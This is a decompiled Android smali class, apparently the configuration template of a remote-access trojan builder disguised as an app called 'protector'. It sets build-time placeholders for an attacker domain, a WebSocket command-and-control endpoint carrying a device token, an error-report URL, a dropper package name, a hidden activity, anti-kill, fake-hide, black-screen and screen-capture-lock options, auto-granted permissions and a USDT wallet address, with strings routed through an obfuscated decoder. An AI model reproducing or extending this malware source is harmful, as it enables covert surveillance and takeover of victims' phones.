.class public Lcom/icontrol/protector/My_Configs;
.super Ljava/lang/Object;
.source "SourceFile"


# static fields
.field public static Access_type:Ljava/lang/String; = null

.field public static Anti_Kill:Ljava/lang/String; = null

.field public static AsstsKey:Ljava/lang/String; = null

.field public static Black_Screen:Ljava/lang/String; = null

.field public static Capture_Lock:Ljava/lang/String; = null

.field public static D_iao:Ljava/lang/String; = null

.field public static Draws_overs:Ljava/lang/String; = null

.field public static Drop_name:Ljava/lang/String; = null

.field public static HA:Ljava/lang/String; = "com.icontrol.protector.HiddenActivity"

.field public static HOME_NAME:Ljava/lang/String; = null

.field public static Hide_Type:Ljava/lang/String; = null

.field public static Is_Store:Ljava/lang/String; = null

.field public static MA:Ljava/lang/String; = "com.icontrol.protector.ActivMain"

.field public static Mob_Name:Ljava/lang/String; = null

.field public static Open_access:Ljava/lang/String; = null

.field public static Sockets_Servers:Ljava/lang/String; = null

.field public static TouchsPath:Ljava/lang/String; = null

.field public static Tracking_Data_str:Ljava/lang/String; = null

.field public static USR_MAIL:Ljava/lang/String; = null

.field public static Use_Access:Ljava/lang/String; = null

.field public static User_allPrims:Ljava/lang/String; = null

.field public static _Login_btn_:Ljava/lang/String; = null

.field public static _Login_dis_:Ljava/lang/String; = null

.field public static _Login_lng_:Ljava/lang/String; = null

.field public static _Notfy_MSG_:Ljava/lang/String; = null

.field public static _Notfy_TITL_:Ljava/lang/String; = null

.field public static admindisplay:Ljava/lang/String; = null

.field public static errospath:Ljava/lang/String; = null

.field public static loadingText:Ljava/lang/String; = null

.field public static mydom:Ljava/lang/String; = null

.field public static usdtadress:Ljava/lang/String; = ""

.field public static CryptoKey:Ljava/lang/String; = null

.field public static CryptoIV:Ljava/lang/String; = null

.field public static CryptoPass:Ljava/lang/String; = null

.field public static CryptoSalt:Ljava/lang/String; = null


# direct methods
.method static constructor <clinit>()V
    .locals 2

    const-string v0, "[OBFS]com.appd.instll"

    const-string v1, "[OBFS]"

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cg0;->e(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/My_Configs;->Drop_name:Ljava/lang/String;

    const-string v0, "[OBFS][Client_N]"

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cg0;->e(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/My_Configs;->Mob_Name:Ljava/lang/String;

    const-string v0, "[OBFS][_NOTIFI_TITLE_]"

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cg0;->e(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/My_Configs;->_Notfy_TITL_:Ljava/lang/String;

    const-string v0, "[OBFS][_NOTIFI_MSG_]"

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cg0;->e(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/My_Configs;->_Notfy_MSG_:Ljava/lang/String;

    const-string v0, "[NAME>LNK>ID!]"

    sput-object v0, Lcom/icontrol/protector/My_Configs;->Tracking_Data_str:Ljava/lang/String;

    const-string v0, "/systems/sys/apps/tch"

    sput-object v0, Lcom/icontrol/protector/My_Configs;->TouchsPath:Ljava/lang/String;

    const-string v0, "/systemscrash/sys/apps/log"

    sput-object v0, Lcom/icontrol/protector/My_Configs;->errospath:Ljava/lang/String;

    const-string v0, ""

    sput-object v0, Lcom/icontrol/protector/My_Configs;->admindisplay:Ljava/lang/String;

    const-string v0, "[USE-AUTOGRANT]"

    sput-object v0, Lcom/icontrol/protector/My_Configs;->loadingText:Ljava/lang/String;

    const-string v0, "[log-dis]"

    sput-object v0, Lcom/icontrol/protector/My_Configs;->_Login_dis_:Ljava/lang/String;

    const-string v0, "[log-btn]"

    sput-object v0, Lcom/icontrol/protector/My_Configs;->_Login_btn_:Ljava/lang/String;

    const-string v0, "[log-lng]"

    sput-object v0, Lcom/icontrol/protector/My_Configs;->_Login_lng_:Ljava/lang/String;

    const-string v0, "[USER_DOM]"

    sput-object v0, Lcom/icontrol/protector/My_Configs;->mydom:Ljava/lang/String;

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "wss://"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v1, Lcom/icontrol/protector/My_Configs;->mydom:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, "/api/ws/?dk=[DEVICE_AUTH_TOKEN]"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/My_Configs;->Sockets_Servers:Ljava/lang/String;

    const-string v0, "[USER_MAIL]"

    sput-object v0, Lcom/icontrol/protector/My_Configs;->USR_MAIL:Ljava/lang/String;

    const-string v0, "[BSE_URL]"

    sput-object v0, Lcom/icontrol/protector/My_Configs;->HOME_NAME:Ljava/lang/String;

    invoke-static {}, Lcom/icontrol/protector/My_Configs;->get_accss()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/My_Configs;->Use_Access:Ljava/lang/String;

    invoke-static {}, Lcom/icontrol/protector/My_Configs;->get_prims()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/My_Configs;->User_allPrims:Ljava/lang/String;

    invoke-static {}, Lcom/icontrol/protector/My_Configs;->get_kill()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/My_Configs;->Anti_Kill:Ljava/lang/String;

    invoke-static {}, Lcom/icontrol/protector/My_Configs;->get_hideentype()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/My_Configs;->Hide_Type:Ljava/lang/String;

    invoke-static {}, Lcom/icontrol/protector/My_Configs;->black_screen()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/My_Configs;->Black_Screen:Ljava/lang/String;

    invoke-static {}, Lcom/icontrol/protector/My_Configs;->get_draw()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/My_Configs;->Draws_overs:Ljava/lang/String;

    invoke-static {}, Lcom/icontrol/protector/My_Configs;->get_oac()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/My_Configs;->Open_access:Ljava/lang/String;

    invoke-static {}, Lcom/icontrol/protector/My_Configs;->get_diao()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/My_Configs;->D_iao:Ljava/lang/String;

    invoke-static {}, Lcom/icontrol/protector/My_Configs;->get_accsstype()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/My_Configs;->Access_type:Ljava/lang/String;

    invoke-static {}, Lcom/icontrol/protector/My_Configs;->get_storemod()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/My_Configs;->Is_Store:Ljava/lang/String;

    invoke-static {}, Lcom/icontrol/protector/My_Configs;->get_caplock()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/My_Configs;->Capture_Lock:Ljava/lang/String;

    invoke-static {}, Lcom/icontrol/protector/My_Configs;->get_asetskey()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/My_Configs;->AsstsKey:Ljava/lang/String;

    const-string v0, "[CRYPTO_KEY]"

    sput-object v0, Lcom/icontrol/protector/My_Configs;->CryptoKey:Ljava/lang/String;

    const-string v0, "[CRYPTO_IV]"

    sput-object v0, Lcom/icontrol/protector/My_Configs;->CryptoIV:Ljava/lang/String;

    const-string v0, "[CRYPTO_PASS]"

    sput-object v0, Lcom/icontrol/protector/My_Configs;->CryptoPass:Ljava/lang/String;

    const-string v0, "[CRYPTO_SALT]"

    sput-object v0, Lcom/icontrol/protector/My_Configs;->CryptoSalt:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public static URL_ERROR()Ljava/lang/String;
    .locals 2

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "https://"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v1, Lcom/icontrol/protector/My_Configs;->mydom:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, "/api/report.php"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public static _Reblace_(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 3

    const-string v0, "."

    const-string v1, ","

    const-string v2, "null"

    if-ne p0, v2, :cond_0

    new-instance p0, Ljava/lang/StringBuilder;

    invoke-direct {p0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-static {v1, v0}, Lcom/icontrol/protector/My_Configs;->_isequel_mth_(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/Boolean;

    move-result-object p1

    invoke-static {p1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    return-object p0

    :cond_0
    if-ne p1, v2, :cond_1

    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p1, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-static {v1, v0}, Lcom/icontrol/protector/My_Configs;->_isequel_mth_(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/Boolean;

    move-result-object p0

    invoke-static {p0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object p0

    invoke-virtual {p1, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    return-object p0

    :cond_1
    const-string v0, ""

    invoke-virtual {p0, p1, v0}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object p0

    return-object p0
.end method

.method public static _isequel_mth_(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/Boolean;
    .locals 1

    invoke-virtual {p0}, Ljava/lang/String;->length()I

    move-result v0

    if-lez v0, :cond_0

    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v0

    if-lez v0, :cond_0

    invoke-virtual {p0, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p0

    if-eqz p0, :cond_0

    sget-object p0, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    return-object p0

    :cond_0
    sget-object p0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    return-object p0
.end method

.method private static black_screen()Ljava/lang/String;
    .locals 1

    const-string v0, "[USE-BLACK]"

    return-object v0
.end method

.method private static get_accss()Ljava/lang/String;
    .locals 1

    const-string v0, "[USE-SUPER]"

    return-object v0
.end method

.method private static get_accsstype()Ljava/lang/String;
    .locals 1

    const-string v0, "[USE-GUID]"

    return-object v0
.end method

.method private static get_asetskey()Ljava/lang/String;
    .locals 1

    const-string v0, "[AST-PAS]"

    return-object v0
.end method

.method private static get_caplock()Ljava/lang/String;
    .locals 1

    const-string v0, "[USE-CAPLOCK]"

    return-object v0
.end method

.method private static get_diao()Ljava/lang/String;
    .locals 1

    const-string v0, "[USE-DIAO]"

    return-object v0
.end method

.method private static get_draw()Ljava/lang/String;
    .locals 1

    const-string v0, "[USE-DRAWOVER]"

    return-object v0
.end method

.method private static get_hideentype()Ljava/lang/String;
    .locals 1

    const-string v0, "[USE-FAKE]"

    return-object v0
.end method

.method private static get_kill()Ljava/lang/String;
    .locals 1

    const-string v0, "[USE-NOKILL]"

    return-object v0
.end method

.method private static get_oac()Ljava/lang/String;
    .locals 1

    const-string v0, "[USE-OOENACC]"

    return-object v0
.end method

.method private static get_prims()Ljava/lang/String;
    .locals 1

    const-string v0, "[USE-ALLPRIM]"

    return-object v0
.end method

.method private static get_storemod()Ljava/lang/String;
    .locals 1

    const-string v0, "[USE-STORE]"

    return-object v0
.end method
